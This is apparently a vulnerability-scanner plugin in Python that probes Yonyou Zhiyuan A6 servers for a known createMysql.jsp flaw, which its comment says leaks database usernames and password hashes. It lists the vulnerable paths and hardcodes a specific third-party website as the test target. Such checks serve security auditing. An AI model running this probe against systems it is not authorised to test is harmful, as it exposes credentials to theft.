#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = dark3r@qq.com
#__Service_ = yongyou_zhiyuan_a6
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0110538
#___Type___ = info
'''
用友致远A6协同系统createMysql.jsp敏感信息泄露
该漏洞泄露了数据库用户的账号，密码hash
'''

def assign(service, arg):
    if service == "yongyou_zhiyuan_a6":
        return True, arg

def audit(arg):
    payloads=['/yyoa/createMysql.jsp','/yyoa/ext/createMysql.jsp']
    
    for payload in payloads:
        url=arg+payload
        code, head, res, errcode, _ = curl.curl(url)
        if code ==200 and 'localhost' in res:
            security_info(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_zhiyuan_a6', 'http://www.ssepec.net/')[1])